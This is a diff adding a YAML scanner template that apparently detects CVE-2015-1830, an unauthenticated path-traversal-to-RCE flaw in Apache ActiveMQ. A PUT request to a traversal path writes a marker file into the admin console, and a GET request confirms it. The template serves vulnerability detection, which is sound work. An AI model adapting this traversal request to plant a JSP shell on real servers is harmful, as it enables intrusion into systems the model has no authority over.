@@ -1,0 +1,24 @@
+name: ActiveMQ_Unauthenticated_RCE_CVE_2015_1830
+transport: http
+detail:
+  dock: product="Apache-ActiveMQ"
+  product: Apache ActiveMQ
+  homepage: http://activemq.apache.org/
+  impact: <p>Path traversal leading to unauthenticated RCE in ActiveMQ.The attacker
+    can put a jsp file in the admin console and execute shell command from there.<br></p>
+  description: There is a directory traversal flaw in the fileserver upload/download
+    functionality used for blob messages. Versions Affected:Apache ActiveMQ 5.0.0
+    - 5.11.1
+rules:
+  r1:
+    method: PUT
+    path: /fileserver/sex../../..\\admin/qetyu.jsp
+    follow_redirects: true
+    body: adgjloure
+    expression: response.status == 204
+  r2:
+    method: GET
+    path: /admin/qetyu.jsp
+    follow_redirects: true
+    expression: response.status == 200 && response.body.bcontains(b'adgjloure')
+expression: r1() && r2()
